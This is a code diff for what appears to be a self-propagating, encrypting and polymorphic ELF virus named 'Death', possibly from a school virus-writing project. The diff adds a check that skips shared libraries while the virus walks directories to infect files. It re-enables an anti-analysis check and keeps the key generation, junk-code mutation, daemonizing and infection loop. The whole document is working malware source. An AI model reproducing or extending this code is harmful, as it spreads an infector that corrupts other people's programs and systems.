@@ -12,7 +12,6 @@
 #include "text.h"
 #include "pestilence.h"
 #include "war.h"
-//#include "daemon.h"
 #include "famine.h"
 #include "death.h"
 #include "syscall.h"
@@ -42,7 +41,8 @@ void	_start(void);
 #define JMP_SIZE 4
 
 /* _start should be here cause we want it at 0x1000,
- * also the linker should compile this file first */
+ * note: we could use a linker script
+ * the linker should compile this file first */
 
 void __attribute__((naked)) _start(void)
 {
@@ -68,8 +68,6 @@ void __attribute__((naked)) _start(void)
 
 char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
 	"Death (c)oded by [diroyer] & [eamar] - deadbeaf:0000\n\0";
-
-//int64_t __attribute__((section(".text#"))) g_key = 0x0;
 
 uint8_t __attribute__((section(".text#")))	g_key[KEY_SIZE] = {0};
 bool __attribute__((section(".text#")))	    g_is_encrypted = false;
@@ -157,7 +155,7 @@ static int	inject(data_t *data) {
 	uint16_t jmp_offset		= (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;
 	uintptr_t start			= (uintptr_t)&_start;
 	uint16_t real_start_off = (uintptr_t)&real_start - (uintptr_t)&_start;
-	//g_key					= gen_key_64();
+
 	getrandom(g_key, KEY_SIZE, 0); JUNK;
 
 	g_is_encrypted = true;
@@ -212,6 +210,22 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 	return 0;
 }
 
+static int check_forbidden(const char *name) {
+
+	const char *forbidden[] = {
+		STR(".so"),
+		NULL
+	};
+
+	for (size_t i = 0; forbidden[i]; ++i) {
+		if (ft_memmem(name, ft_strlen(name), forbidden[i], ft_strlen(forbidden[i])) != NULL) {
+			return 1;
+		}
+	} JUNK;
+
+	return 0;
+}
+
 static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 {
 
@@ -250,6 +264,9 @@ static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 				ptr = ft_stpncpy(ptr, file, NAME_MAX - (ptr - new_path));
 				ptr = ft_stpncpy(ptr, STR("/"), NAME_MAX - (ptr - new_path));
 				ft_stpncpy(ptr, dir->d_name, NAME_MAX - (ptr - new_path));
+
+				if (check_forbidden(dir->d_name) != 0)
+					continue;
 
 				mutate();
 
@@ -298,8 +315,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-
-	//if (pestilence() != 0) return ;
+	if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
 	uint8_t key[KEY_SIZE];
@@ -310,11 +326,13 @@ void	entrypoint(int argc, char **argv, char **envp)
 		.is_encrypted = g_is_encrypted,
 		.key = {0}
 	};
+
 	ft_memcpy(saved.key, key, KEY_SIZE);
 
 	prepare_mutate();
 
 	g_envp = bootstrap_data.envp;
+
 	daemonize(); JUNK;
 
 	famine(&bootstrap_data, &counter);
